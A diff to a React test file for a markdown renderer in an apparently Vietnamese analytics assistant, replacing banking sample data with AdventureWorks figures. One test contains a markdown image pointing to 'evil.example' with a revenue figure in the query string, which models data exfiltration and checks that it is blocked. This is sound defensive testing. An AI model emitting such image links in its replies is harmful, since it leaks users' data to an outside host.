@@ -9,10 +9,10 @@ import { MarkdownContent } from './MarkdownContent';
 
 const doc: Citation = {
   index: 1,
-  source: 'Quy định QD-GV-2026/02',
+  source: 'Định nghĩa chỉ số AW-KPI-01',
   type: 'document',
-  snippet: 'Biên lợi nhuận gộp bằng tổng lãi gộp chia tổng doanh thu thuần',
-  doc_id: 'a0000000-0000-0000-0000-000000000c12',
+  snippet: 'Biên lợi nhuận gộp Internet bằng tổng lãi gộp chia tổng doanh thu Internet',
+  doc_id: 'a0000000-0000-0000-0000-000000aa0e01',
   score: 0.91,
 };
 
@@ -22,14 +22,14 @@ describe('MarkdownContent', () => {
       <MarkdownContent
         text={[
           '## Biên lợi nhuận',
-          'Biên **giảm** ở Hà Nội.',
+          'Biên **giảm** ở Bikes.',
           '',
-          '| Chi nhánh | Biên |',
+          '| Nhóm sản phẩm | Biên |',
           '| --- | --- |',
-          '| Hà Nội | 18,2% |',
+          '| Bikes | 40,5% |',
           '',
-          '- tháng 8',
-          '- tháng 9',
+          '- tháng 11/2013',
+          '- tháng 12/2013',
           '',
           '```sql',
           'SELECT 1',
@@ -40,7 +40,7 @@ describe('MarkdownContent', () => {
     expect(screen.getByText('Biên lợi nhuận')).toHaveClass('da-heading-2');
     expect(screen.getByText('giảm').tagName).toBe('STRONG');
     expect(screen.getByRole('table')).toBeInTheDocument();
-    expect(screen.getByRole('cell', { name: '18,2%' })).toBeInTheDocument();
+    expect(screen.getByRole('cell', { name: '40,5%' })).toBeInTheDocument();
     expect(screen.getAllByRole('listitem')).toHaveLength(2);
     expect(container.querySelector('pre code')?.textContent).toBe('SELECT 1\n');
   });
@@ -54,7 +54,7 @@ describe('MarkdownContent', () => {
         onOpenCitation={open}
       />,
     );
-    const marker = screen.getByRole('button', { name: 'Mở nguồn 1: Quy định QD-GV-2026/02' });
+    const marker = screen.getByRole('button', { name: 'Mở nguồn 1: Định nghĩa chỉ số AW-KPI-01' });
     expect(marker).toHaveAttribute('title', expect.stringContaining('điểm 0.91'));
     fireEvent.click(marker);
     expect(open).toHaveBeenCalledWith(doc);
@@ -78,16 +78,16 @@ describe('MarkdownContent', () => {
 
   it('loads no image the text names: an injected one would carry the data away', () => {
     const { container } = render(
-      <MarkdownContent text={'Dư nợ 1.284 tỷ ![biểu đồ](https://evil.example/c.png?q=1284)'} />,
+      <MarkdownContent text={'Doanh thu 16,35 triệu USD ![biểu đồ](https://evil.example/c.png?q=1635)'} />,
     );
     expect(container.querySelector('img')).toBeNull();
     expect(container.innerHTML).not.toContain('evil.example');
   });
 
   it('opens an http link in a new tab without an opener', () => {
-    render(<MarkdownContent text="[NHNN](https://www.sbv.gov.vn)" />);
-    const link = screen.getByRole('link', { name: 'NHNN' });
-    expect(link).toHaveAttribute('href', 'https://www.sbv.gov.vn');
+    render(<MarkdownContent text="[AdventureWorks](https://github.com/microsoft/sql-server-samples)" />);
+    const link = screen.getByRole('link', { name: 'AdventureWorks' });
+    expect(link).toHaveAttribute('href', 'https://github.com/microsoft/sql-server-samples');
     expect(link).toHaveAttribute('target', '_blank');
     expect(link).toHaveAttribute('rel', 'noopener noreferrer');
   });
